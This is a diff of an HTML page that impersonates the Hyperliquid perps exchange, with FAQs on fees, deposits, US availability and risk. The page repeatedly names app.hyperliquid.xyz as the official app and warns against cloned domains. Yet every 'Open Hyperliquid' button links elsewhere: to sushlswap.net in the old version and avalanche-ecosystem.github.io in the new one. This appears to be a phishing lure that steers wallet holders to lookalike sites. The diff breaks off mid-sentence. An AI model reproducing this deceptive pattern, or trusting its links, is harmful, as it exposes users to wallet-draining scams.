@@ -1,266 +1,47 @@
-<!DOCTYPE html>
-<html dir="ltr" lang="en"><head>
-<meta charset="utf-8"/><meta content="width=device-width, initial-scale=1, viewport-fit=cover" name="viewport"/>
-<title>Hyperliquid — Perps DEX</title>
-<meta content="Hyperliquid is a non-custodial Perps DEX. Open the app and trade perps from your own wallet." name="description"/>
-<meta content="index,follow,max-image-preview:large" name="robots"/>
-<link href="https://hyperliquid-usa.github.io/" rel="canonical"/>
-<link href="https://hyperliquid-usa.github.io/" hreflang="en" rel="alternate"/><link href="https://hyperliquid-usa.github.io/" hreflang="x-default" rel="alternate"/>
-<meta content="#080F0B" name="theme-color"/>
-<meta content="website" property="og:type"/><meta content="Hyperliquid — Perps DEX" property="og:title"/><meta content="Hyperliquid is a non-custodial Perps DEX. Open the app and trade perps from your own wallet." property="og:description"/>
-<meta content="https://hyperliquid-usa.github.io/" property="og:url"/><meta content="https://hyperliquid-usa.github.io/og-cover.png" property="og:image"/><meta content="en" property="og:locale"/>
-<meta content="summary_large_image" name="twitter:card"/><meta content="Hyperliquid — Perps DEX" name="twitter:title"/><meta content="Hyperliquid is a non-custodial Perps DEX. Open the app and trade perps from your own wallet." name="twitter:description"/><meta content="https://hyperliquid-usa.github.io/og-cover.png" name="twitter:image"/>
-<link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="site.webmanifest" rel="manifest"/><link href="static/icon-180.png" rel="apple-touch-icon"/>
-<link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&amp;family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/>
-<link href="static/style.css" rel="stylesheet"/>
-<script type="application/ld+json">{
-  "@context": "https://schema.org",
-  "@graph": [
-    {
-      "@type": "WebSite",
-      "@id": "https://hyperliquid-usa.github.io/#website",
-      "url": "https://hyperliquid-usa.github.io/",
-      "name": "Hyperliquid"
-    },
-    {
-      "@type": "WebPage",
-      "@id": "https://hyperliquid-usa.github.io/#webpage",
-      "url": "https://hyperliquid-usa.github.io/",
-      "name": "Hyperliquid — Perps DEX",
-      "description": "Hyperliquid is a non-custodial Perps DEX. Open the app and trade perps from your own wallet.",
-      "inLanguage": "en",
-      "isPartOf": {
-        "@id": "https://hyperliquid-usa.github.io/#website"
-      }
-    },
-    {
-      "@type": "Organization",
-      "@id": "https://hyperliquid-usa.github.io/#org",
-      "name": "Hyperliquid",
-      "url": "https://hyperliquid-usa.github.io/",
-      "logo": "https://hyperliquid-usa.github.io/og-cover.png"
-    },
-    {
-      "@type": "WebApplication",
-      "@id": "https://hyperliquid-usa.github.io/#app",
-      "name": "Hyperliquid",
-      "url": "https://hyperliquid-usa.github.io/",
-      "applicationCategory": "FinanceApplication",
-      "operatingSystem": "Web",
-      "browserRequirements": "Requires JavaScript",
-      "description": "Hyperliquid is a non-custodial Perps DEX. Open the app and trade perps from your own wallet.",
-      "featureList": [
-        "Perps DEX",
-        "Trade perps and spot, onchain"
-      ],
-      "isPartOf": {
-        "@id": "https://hyperliquid-usa.github.io/#website"
-      }
-    },
-    {
-      "@type": "FAQPage",
-      "@id": "https://hyperliquid-usa.github.io/#faq",
-      "inLanguage": "en",
-      "mainEntity": [
-        {
-          "@type": "Question",
-          "name": "Is Hyperliquid an exchange or a blockchain?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Both concepts apply. Hyperliquid is a layer one blockchain with HyperCore for onchain perps and spot order books, plus HyperEVM for EVM-compatible smart contracts. The project overview in the official docs is the best starting point for the architecture."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "Can US users trade on Hyperliquid?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Access may depend on jurisdiction, interface rules, and applicable law. Do not assume that a third-party frontend or workaround makes trading appropriate for your location. Start with Hyperliquid's official links and review any terms shown by the interface you use."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What do I need before trading on Hyperliquid?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "You need a supported account method, collateral, and a verified deposit route. The onboarding guide explains wallet and email login options, supported deposit paths, and the basic flow for placing a perpetuals trade."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "How should I think about Hyperliquid fees?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "Treat fees as components: trading fee tier, funding, spread, slippage, withdrawal charges, and any market deployer rules. Hyperliquid's fee docs separate perps and spot schedules and explain how weighted activity can affect fee tiering."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What is HYPE used for?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "HYPE is tied to Hyperliquid's network functions, including validator delegation on HyperCore and gas on HyperEVM. The staking docs cover delegation mechanics, while the HyperEVM docs explain HYPE's role as the native gas token."
-          }
-        },
-        {
-          "@type": "Question",
-          "name": "What are the main risks with Hyperliquid?",
-          "acceptedAnswer": {
-            "@type": "Answer",
-            "text": "The main risks include normal trading losses, leverage liquidation, liquidity changes, bridge or smart contract issues, oracle problems, and network-level failure. Hyperliquid's own risk page says its list is not exhaustive, so size positions accordingly."
-          }
-        }
-      ]
-    }
-  ]
-}</script></head>
-<body>
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Hyperliquid USA - Open App</title><meta name="description" content="hyperliquid usa guide to open the official perps app, verify the domain, connect a wallet, and check availability before trading.">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<link rel="canonical" href="https://hyperliquid-usa.github.io/"><meta name="theme-color" content="#FFFFFF">
+<meta property="og:type" content="website"><meta property="og:title" content="Hyperliquid USA - Open App"><meta property="og:description" content="hyperliquid usa guide to open the official perps app, verify the domain, connect a wallet, and check availability before trading.">
+<meta property="og:url" content="https://hyperliquid-usa.github.io/"><meta property="og:image" content="https://hyperliquid-usa.github.io/og-cover.png"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Hyperliquid USA - Open App"><meta name="twitter:description" content="hyperliquid usa guide to open the official perps app, verify the domain, connect a wallet, and check availability before trading."><meta name="twitter:image" content="https://hyperliquid-usa.github.io/og-cover.png">
+<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
+<link rel="stylesheet" href="static/style.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "WebSite", "@id": "https://hyperliquid-usa.github.io/#website", "url": "https://hyperliquid-usa.github.io/", "name": "Hyperliquid"}, {"@type": "WebPage", "@id": "https://hyperliquid-usa.github.io/#webpage", "url": "https://hyperliquid-usa.github.io/", "name": "Hyperliquid USA - Open App", "description": "hyperliquid usa guide to open the official perps app, verify the domain, connect a wallet, and check availability before trading.", "inLanguage": "en", "isPartOf": {"@id": "https://hyperliquid-usa.github.io/#website"}}, {"@type": "Organization", "@id": "https://hyperliquid-usa.github.io/#org", "name": "Hyperliquid", "url": "https://hyperliquid-usa.github.io/", "logo": "https://hyperliquid-usa.github.io/og-cover.png", "sameAs": ["https://github.com/hyperliquid-dex", "https://www.coingecko.com/en/coins/hyperliquid", "https://hyperfoundation.org/"]}, {"@type": "WebApplication", "@id": "https://hyperliquid-usa.github.io/#app", "name": "Hyperliquid USA", "url": "https://hyperliquid-usa.github.io/", "applicationCategory": "FinanceApplication", "operatingSystem": "Web", "browserRequirements": "Requires JavaScript", "description": "hyperliquid usa guide to open the official perps app, verify the domain, connect a wallet, and check availability before trading.", "featureList": ["Official app domain: app.hyperliquid.xyz", "Onchain perps and spot order books", "Built on the Hyperliquid L1"], "isPartOf": {"@id": "https://hyperliquid-usa.github.io/#website"}}, {"@type": "FAQPage", "@id": "https://hyperliquid-usa.github.io/#faq", "inLanguage": "en", "mainEntity": [{"@type": "Question", "name": "Is there a separate Hyperliquid USA website?", "acceptedAnswer": {"@type": "Answer", "text": "No verified separate US-specific Hyperliquid app is needed for normal navigation. The official trading app is app.hyperliquid.xyz, and users should verify that domain directly. A page claiming to be a special US mirror or faster onboarding path should be treated as suspicious unless it is linked by official Hyperliquid resources."}}, {"@type": "Question", "name": "Can US residents trade on Hyperliquid?", "acceptedAnswer": {"@type": "Answer", "text": "Availability can depend on current app restrictions and local rules. Users should read official notices and should not bypass geographic or eligibility controls. This is not legal advice; it is a domain and risk-oriented answer for searchers trying to find the official venue safely."}}, {"@type": "Question", "name": "What is the safest Hyperliquid URL for US searchers?", "acceptedAnswer": {"@type": "Answer", "text": "Use app.hyperliquid.xyz for the trading interface and verify it against the official Hyperliquid docs. Avoid sponsored search links, private-message links and cloned domains. Before depositing, confirm that the wallet or email login, destination address and network match the app's official flow."}}, {"@type": "Question", "name": "Does Hyperliquid require KYC in the USA?", "acceptedAnswer": {"@type": "Answer", "text": "Hyperliquid onboarding in the official docs describes wallet access and email login rather than a conventional centralized exchange account flow. That does not answer legal eligibility. Users should check official app notices and local rules before using the product, especially because perps access can be restricted by jurisdiction."}}, {"@type": "Question", "name": "Can I deposit from Coinbase to Hyperliquid?", "acceptedAnswer": {"@type": "Answer", "text": "The official Hyperliquid guide mentions moving funds from a centralized exchange to supported onboarding routes as an option, but users must choose the exact supported asset and network shown by the app. A common documented path is USDC on Arbitrum, with ETH needed for Arbitrum gas before depositing."}}, {"@type": "Question", "name": "What risks matter most for Hyperliquid USA users?", "acceptedAnswer": {"@type": "Answer", "text": "The main risks are eligibility, leverage, liquidation, funding costs, deposit or withdrawal mistakes, app-domain spoofing and smart-contract or protocol risk. US users should be especially careful not to treat a search result as proof of availability. Start with the official app, read notices, and avoid workarounds."}}]}]}</script>
+</head><body>
 <header class="site-header">
-<a aria-label="Hyperliquid" class="brand" href="#top">
-<svg aria-hidden="true" class="brand-mark" viewbox="0 0 32 32"><defs><lineargradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="#66F4AD"></stop><stop offset=".5" stop-color="#16C76E"></stop><stop offset="1" stop-color="#108D4F"></stop></lineargradient></defs><g fill="none" stroke="url(#g)" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.4"><circle cx="13" cy="13" r="6.2"></circle><circle cx="20" cy="20" r="6.2"></circle></g></svg>
-<h1>Hyperliquid</h1>
-</a>
-<nav aria-label="Primary" class="site-nav"><ul class="nav-list"><li><a href="#how-it-works">How it works</a></li><li><a href="#costs-and-risk">Costs &amp; risk</a></li><li><a href="#hyperevm-and-hype">Hyperevm &amp; hype</a></li><li><a href="#core-surfaces">Core surfaces</a></li><li><a href="#pre-trade-checks">Pre trade checks</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-<span class="header-spacer"></span>
-<a class="cta cta-primary header-cta" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Hyperliquid</a>
-<button aria-expanded="false" aria-label="Menu" class="nav-toggle"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2" viewbox="0 0 24 24"><path d="M4 7h16M4 12h16M4 17h16"></path></svg></button>
+  <a class="brand" href="#top" aria-label="Hyperliquid"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Hyperliquid</span></a>
+  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
+  <span class="header-spacer"></span>
+  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App ↗</a>
+  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
 </header>
 <main id="top">
-<section class="hero"><div class="container"><div class="hero-grid">
-<div class="hero-copy">
-<h2 class="hero-title">Trade perps and spot, onchain</h2>
-<p class="lead">A clean guide to <strong>Hyperliquid</strong>'s onchain perps, spot markets, HYPE, HyperEVM, and practical trading risks.</p>
-<div class="hero-cta-row"><a class="cta cta-primary" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Hyperliquid ↗</a><a class="cta cta-secondary" href="#what-is">Learn more</a></div>
-<p class="hero-note">Live preview — open Hyperliquid to trade.</p><div class="trust-row"><span class="trust-chip">On-chain</span><span class="trust-chip">Non-custodial</span></div>
-</div>
-<div class="hero-widget">
-<div aria-hidden="true" class="floating-coins"></div>
-<div class="swap-widget" id="app-widget">
-<div class="swap-widget-head"><span>Trade</span><span class="badge">DEX</span></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">From</span><span class="swap-amount">1.00</span></div><span class="token-chip" data-slot="from"><span class="token-icon-morph"><img alt="USDC" class="" decoding="async" height="28" loading="lazy" src="usdc.png" width="28"/></span><span class="token-ticker">USDC</span></span></div>
-<div class="swap-flip-wrap"><button aria-label="Switch" class="swap-flip" type="button"><svg fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24"><path d="M7 4v16M7 20l-3-3M7 4l3 3M17 20V4M17 4l3 3M17 20l-3-3"></path></svg></button></div>
-<div class="swap-row"><div class="swap-col"><span class="swap-label">To</span><span class="swap-amount">~1.00</span></div><span class="token-chip" data-slot="to"><span class="token-icon-morph"><span aria-hidden="true" class="coin-fallback">BTC-P</span></span><span class="token-ticker">BTC-P</span></span></div>
-<a class="cta cta-primary swap-now-main" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open Hyperliquid ↗</a>
-<p class="swap-note">Preview — open Hyperliquid to trade.</p>
-</div>
-</div>
-</div></div></section>
-<section class="section section-alt" id="what-is"><div class="container"><h2>What is Hyperliquid?</h2><div class="capsule"><strong>Hyperliquid</strong> is a layer one blockchain focused on onchain trading, with HyperCore handling perpetual futures and spot order books and HyperEVM adding an EVM environment for builders. Its own <a href="https://hyperliquid.gitbook.io/hyperliquid-docs" rel="noopener noreferrer">Hyperliquid docs</a> describe the platform as a unified financial system, but users should still evaluate liquidity, leverage, bridge mechanics, and jurisdiction rules before using any trading interface.</div></div></section>
-<section class="section section-alt" id="how-it-works">
-<div class="container"><h2>How Hyperliquid works</h2><p class="section-intro">Hyperliquid combines an exchange-style order book with blockchain settlement. Traders interact through supported interfaces, while orders, cancels, trades, and liquidations are handled on HyperCore.</p>
-<ol class="steps"><li><strong>Connect an account</strong><span>Use a supported wallet or email login through an interface that you have verified from trusted sources.</span></li><li><strong>Add collateral</strong><span>Funding paths vary by asset and network, so confirm the exact deposit route before sending funds.</span></li><li><strong>Choose a market</strong><span>Perpetuals let you long or short with collateral, while spot markets trade the asset itself.</span></li><li><strong>Manage the position</strong><span>Monitor margin, funding, liquidation risk, open orders, and withdrawal requirements rather than treating execution as final profit.</span></li></ol>
-</div>
-</section>
-<section class="section" id="costs-and-risk">
-<div class="container"><h2>Fees, funding, and risk</h2><p class="section-intro">The right way to read Hyperliquid costs is as a stack of components, not a single fixed number. Leverage and market conditions can matter more than the visible trading fee.</p>
-<div class="cards three"><article class="card"><h3>Trading costs</h3><p>Hyperliquid uses separate fee schedules for perps and spot, with tiering based on weighted activity according to the <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/trading/fees" rel="noopener noreferrer">fees documentation</a>. Also account for funding, spread, slippage, withdrawal charges, and any deployer-specific fee share.</p></article><article class="card"><h3>Protocol risks</h3><p>The <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/risks" rel="noopener noreferrer">risk page</a> calls out smart contract, L1, liquidity, and oracle manipulation risk. Those risks are separate from normal trading losses caused by leverage or market movement.</p></article><article class="card"><h3>Account control</h3><p>Wallet keys, email account access, staking links, and sub-account setup affect who can move funds or trade. Verify actions before signing and treat permanent links as high-impact account changes.</p></article></div>
-</div>
-</section>
-<section class="section section-alt" id="hyperevm-and-hype">
-<div class="container"><h2>HyperEVM and HYPE</h2><p class="section-intro">Hyperliquid is broader than a perps interface. HYPE is used in the network, while HyperEVM gives developers an EVM-compatible environment tied to Hyperliquid infrastructure.</p>
-<div class="cards three"><article class="card"><h3>HyperEVM</h3><p>The <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm" rel="noopener noreferrer">HyperEVM docs</a> describe EVM blocks built as part of Hyperliquid execution, with HYPE as the native gas token. Users should rely on verified RPC and app sources.</p></article><article class="card"><h3>HYPE staking</h3><p>HYPE can be delegated to validators inside HyperCore. The <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/hypercore/staking" rel="noopener noreferrer">staking docs</a> explain validator delegation, lockups, reward mechanics, and the unstaking queue.</p></article><article class="card"><h3>Core to EVM transfers</h3><p>Transfers between HyperCore and HyperEVM have specific token-linking rules. Review the <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm/hypercore-less-than-greater-than-hyperevm-transfers" rel="noopener noreferrer">transfer documentation</a> before moving HYPE or linked spot assets.</p></article></div>
-</div>
-</section>
-<section class="section" id="core-surfaces">
-<div class="container">
-<h2>Main Hyperliquid surfaces</h2>
-<p class="section-intro">These are the core areas most readers should understand before trading or building around Hyperliquid.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">PERP</span>
-<div><h3>Perpetuals</h3><p class="coin-sub">Long or short with collateral <span class="tag">Trading</span></p></div>
-</div>
-<p class="coin-intent">Perps are the main trading surface for directional exposure. Check margin mode, funding, order type, and liquidation levels before opening size.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="PERP" href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">SPOT</span>
-<div><h3>Spot markets</h3><p class="coin-sub">Buy and sell listed assets <span class="tag">Trading</span></p></div>
-</div>
-<p class="coin-intent">Spot is simpler than leverage, but deposits, withdrawals, spread, and supported quote assets still matter. Confirm the asset and network path first.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="SPOT" href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><img alt="HYPE" class="coin-icon" decoding="async" height="40" loading="lazy" src="hype.png" width="40"/>
-<div><h3>HYPE staking</h3><p class="coin-sub">Delegate to validators <span class="tag">Staking</span></p></div>
-</div>
-<p class="coin-intent">Staking happens inside HyperCore and depends on validator selection. Read lockup, withdrawal queue, and commission details before delegating.</p>
-<a class="cta cta-mini swap-now" data-icon="hype.png" data-ticker="HYPE" href="https://hyperliquid.gitbook.io/hyperliquid-docs/hypercore/staking" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">EVM</span>
-<div><h3>HyperEVM</h3><p class="coin-sub">EVM apps on Hyperliquid <span class="tag">Builders</span></p></div>
-</div>
-<p class="coin-intent">HyperEVM supports smart contract activity with HYPE as gas. Use verified RPC settings and understand that EVM assets may differ from Core spot assets.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="EVM" href="https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/hyperevm" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">HLP</span>
-<div><h3>HLP vault</h3><p class="coin-sub">Protocol liquidity vault <span class="tag">Vault</span></p></div>
-</div>
-<p class="coin-intent">HLP provides liquidity and can have profit or loss. Treat vault exposure as strategy risk, not a passive yield substitute.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="HLP" href="https://hyperliquid.gitbook.io/hyperliquid-docs/hypercore/vaults/protocol-vaults" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">API</span>
-<div><h3>API access</h3><p class="coin-sub">Data and trading endpoints <span class="tag">Dev</span></p></div>
-</div>
-<p class="coin-intent">Developers can build around market data and trading workflows. Separate testnet experiments from mainnet behavior when validating a system.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="API" href="https://hyperliquid.gitbook.io/hyperliquid-docs/for-developers/api" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="pre-trade-checks">
-<div class="container">
-<h2>Pre-trade checks</h2>
-<p class="section-intro">A short checklist helps avoid common mistakes around access, deposits, margin, and withdrawals.</p>
-<div class="coin-grid">
-<article class="coin-card featured">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">LINK</span>
-<div><h3>Official links</h3><p class="coin-sub">Verify the app and docs <span class="tag">Verify</span></p></div>
-</div>
-<p class="coin-intent">Start from known links rather than search ads or copied messages. The support article lists the canonical site, app, docs, and social links.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="LINK" href="https://sushlswap.net/" rel="noopener noreferrer" target="_blank">Open ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">COLL</span>
-<div><h3>Collateral route</h3><p class="coin-sub">Check asset and network <span class="tag">Funds</span></p></div>
-</div>
-<p class="coin-intent">Deposits are route-specific. A correct token on the wrong network can be delayed, unsupported, or difficult to recover.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="COLL" href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">MRGN</span>
-<div><h3>Margin settings</h3><p class="coin-sub">Know position exposure <span class="tag">Risk</span></p></div>
-</div>
-<p class="coin-intent">Leverage changes how quickly losses affect collateral. Review margin mode, position size, and liquidation before entering a trade.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="MRGN" href="https://hyperliquid.gitbook.io/hyperliquid-docs/trading/margining" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-<article class="coin-card">
-<div class="coin-card-head"><span aria-hidden="true" class="coin-icon coin-fallback">FEE</span>
-<div><h3>Fee stack</h3><p class="coin-sub">Include all components <span class="tag">Costs</span></p></div>
-</div>
-<p class="coin-intent">Maker-taker fees are only one part of cost. Funding, spread, slippage, withdrawals, and deployer rules can change the result.</p>
-<a class="cta cta-mini swap-now" data-icon="" data-ticker="FEE" href="https://hyperliquid.gitbook.io/hyperliquid-docs/trading/fees" rel="noopener noreferrer" target="_blank">Docs ↗</a>
-</article>
-</div>
-</div>
-</section>
-<section class="section section-alt" id="faq"><div class="container"><h2>Hyperliquid FAQ</h2><div class="faq-list">
-<details open=""><summary><h3>Is Hyperliquid an exchange or a blockchain?</h3></summary><div>Both concepts apply. Hyperliquid is a layer one blockchain with HyperCore for onchain perps and spot order books, plus HyperEVM for EVM-compatible smart contracts. The project overview in the <a href="https://hyperliquid.gitbook.io/hyperliquid-docs" rel="noopener noreferrer">official docs</a> is the best starting point for the architecture.</div></details>
-<details open=""><summary><h3>Can US users trade on Hyperliquid?</h3></summary><div>Access may depend on jurisdiction, interface rules, and applicable law. Do not assume that a third-party frontend or workaround makes trading appropriate for your location. Start with Hyperliquid's <a href="https://hyperliquid.zendesk.com/hc/en-us/articles/15931545575572-What-are-the-official-links-for-Hyperliquid" rel="noopener noreferrer">official links</a> and review any terms shown by the interface you use.</div></details>
-<details><summary><h3>What do I need before trading on Hyperliquid?</h3></summary><div>You need a supported account method, collateral, and a verified deposit route. The <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading" rel="noopener noreferrer">onboarding guide</a> explains wallet and email login options, supported deposit paths, and the basic flow for placing a perpetuals trade.</div></details>
-<details><summary><h3>How should I think about Hyperliquid fees?</h3></summary><div>Treat fees as components: trading fee tier, funding, spread, slippage, withdrawal charges, and any market deployer rules. Hyperliquid's <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/trading/fees" rel="noopener noreferrer">fee docs</a> separate perps and spot schedules and explain how weighted activity can affect fee tiering.</div></details>
-<details><summary><h3>What is HYPE used for?</h3></summary><div>HYPE is tied to Hyperliquid's network functions, including validator delegation on HyperCore and gas on HyperEVM. The <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/hypercore/staking" rel="noopener noreferrer">staking docs</a> cover delegation mechanics, while the HyperEVM docs explain HYPE's role as the native gas token.</div></details>
-<details><summary><h3>What are the main risks with Hyperliquid?</h3></summary><div>The main risks include normal trading losses, leverage liquidation, liquidity changes, bridge or smart contract issues, oracle problems, and network-level failure. Hyperliquid's own <a href="https://hyperliquid.gitbook.io/hyperliquid-docs/risks" rel="noopener noreferrer">risk page</a> says its list is not exhaustive, so size positions accordingly.</div></details>
-</div></div></section>
+  <section class="hero">
+    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
+    <div class="container">
+      <h1>Hyperliquid USA</h1>
+      <div class="appcard"><div class="appcard-head"><img src="favicon.png" alt="" width="40" height="40"><b>Hyperliquid</b><span class="badge">Perps DEX</span></div><div class="appcard-chips"><span><b>Category</b> Onchain perps and spot exchange</span><span><b>Network</b> Hyperliquid L1</span><span><b>Token</b> HYPE</span><span><b>Custody</b> Self-custody account access with app deposits</span></div><a class="btn btn-dark" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Hyperliquid App ↗</a></div>
+      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Hyperliquid ↗</a></div>
+      <p class="hero-note">Live preview — open the official Hyperliquid app from your own wallet.</p>
+      <div class="trust-row"><span class="trust-chip">Official app domain: app.hyperliquid.xyz</span><span class="trust-chip">Onchain perps and spot order books</span><span class="trust-chip">Built on the Hyperliquid L1</span></div>
+    </div>
+  </section>
+  <section class="section" id="about"><div class="container"><h2>What is Hyperliquid USA?</h2><div class="capsule"><strong>Hyperliquid</strong> is an onchain exchange and L1 built around performant <a class="inline-link" href="https://www.investopedia.com/terms/p/perpetual-futures.asp" rel="noopener noreferrer">perpetual futures</a> and spot order books; the official overview is available in the <a href='https://hyperliquid.gitbook.io/hyperliquid-docs'>Hyperliquid docs</a>.</div></div></section>
+  <section class="section" id="facts"><div class="container"><h2><a class="inline-link" href="https://www.coingecko.com/en/coins/hyperliquid" rel="noopener noreferrer">Hype</a>rliquid USA at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>Onchain perps and spot exchange</b></div><div class="f"><small>Network</small><b>Hyperliquid L1</b></div><div class="f"><small>Token</small><b>HYPE</b></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://ethereum.org/en/wallets/" rel="noopener noreferrer">Self-custody</a> account access with app deposits</b></div><div class="f"><small>Official app</small><b>app.hyperliquid.xyz</b></div></div></div></section>
+  <section class="section section-alt"><div class="container"><h2>Is Hyperliquid available in the USA?</h2><div class="intent-a">Hyperliquid USA searches are mostly about access, not a separate US product. The safe answer is that users should check the official app notices, terms and local rules before connecting or trading, and they should not bypass access controls. Hyperliquid is a decentralized perps and spot venue, but availability can depend on current interface restrictions and the user's <a class="inline-link" href="https://www.reuters.com/technology/fca-warns-hyperliquid-crypto-perps-uk-2026/" rel="noopener noreferrer">jurisdiction</a>. This page should route users to the official domain only; it should not promise US eligibility, provide legal advice or suggest VPN workarounds.</div></div></section><section class="section"><div class="container"><h2>Hyperliquid USA app URL and domain</h2><div class="intent-a">The official Hyperliquid trading app is app.hyperliquid.xyz, and the official docs use that route in the <a class="inline-link" href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading.md" rel="noopener noreferrer">onboarding guide</a>. Users searching Hyperliquid USA are often trying to avoid fake app links or ads. Verify the browser domain before connecting a wallet, entering an email login or depositing assets. A cloned app can imitate the trading screen while changing wallet approvals or deposit addresses. Bookmark the official app and cross-check with the official docs or <a class="inline-link" href="https://hyperliquidpolicy.org/blog/advancing-policy-for-the-house-of-all-finance" rel="noopener noreferrer">Hyper Foundation</a> resources if a link comes from search ads or social replies.</div></div></section><section class="section section-alt"><div class="container"><h2>Hyperliquid USA deposit and withdrawal</h2><div class="intent-a">The official onboarding docs describe <a class="inline-link" href="https://l2beat.com/scaling/projects/arbitrum" rel="noopener noreferrer">depositing USDC through Arbitrum</a>, using ETH for Arbitrum gas, and withdrawing USDC back to Arbitrum through the app. They also document other supported onboarding assets and an <a class="inline-link" href="https://hyperliquid.gitbook.io/hyperliquid-docs/onboarding/how-to-start-trading.md" rel="noopener noreferrer">email login path</a>. For US users, the first question is availability; the second is route accuracy. If the app is available to you, verify the deposit chain, token, destination address, current withdrawal fee, recipient wallet and whether open positions affect withdrawable balance. Do not send funds to addresses from unofficial guides.</div></div></section><section class="section"><div class="container"><h2>Hyperliquid USA fees, leverage and liquidation risk</h2><div class="intent-a">Hyperliquid perps involve leverage, funding, liquidation and fee risk, which is why US searchers often look for practical trading terms. The official trading documentation has sections for fees, funding, margining, liquidations and order types. The app's live values matter more than a static summary. Before placing a trade, review leverage, notional 